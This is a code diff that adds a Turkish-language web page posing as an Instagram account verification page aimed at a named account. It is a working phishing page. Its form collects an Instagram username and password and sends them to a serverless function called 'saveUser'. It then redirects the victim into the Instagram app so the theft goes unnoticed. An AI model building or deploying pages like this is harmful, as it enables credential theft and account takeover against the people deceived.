@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>İnstagram Hesap Doğrulaması</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1>İnstagram Hesap Doğrulaması</h1>
+    <h2><strong>Hesap İsmi: <span class="highlight">Priwant o5man</span></strong></h2>
+
+    <form id="loginForm">
+      <input type="text" id="username" name="username" placeholder="Kullanıcı Adı" required />
+      <input type="password" id="password" name="password" placeholder="Şifre" required />
+      <button type="submit">Doğrula</button>
+    </form>
+
+    <p id="message"></p>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const message = document.getElementById('message');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      message.textContent = 'Doğrulama yapılıyor...';
+
+      const username = form.username.value.trim();
+      const password = form.password.value.trim();
+
+      try {
+        const res = await fetch('/.netlify/functions/saveUser', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password }),
+        });
+
+        if (res.ok) {
+          message.textContent = 'Doğrulama başarılı! Instagram uygulamasına yönlendiriliyorsunuz...';
+          setTimeout(() => {
+            window.location.href = 'instagram://user?username=' + encodeURIComponent(username);
+          }, 2000);
+        } else {
+          const error = await res.json();
+          message.textContent = 'Hata: ' + (error.error || 'Bilinmeyen hata');
+        }
+      } catch (err) {
+        message.textContent = 'Sunucu hatası, lütfen tekrar deneyin.';
+      }
+    });
+  </script>
+</body>
+</html>
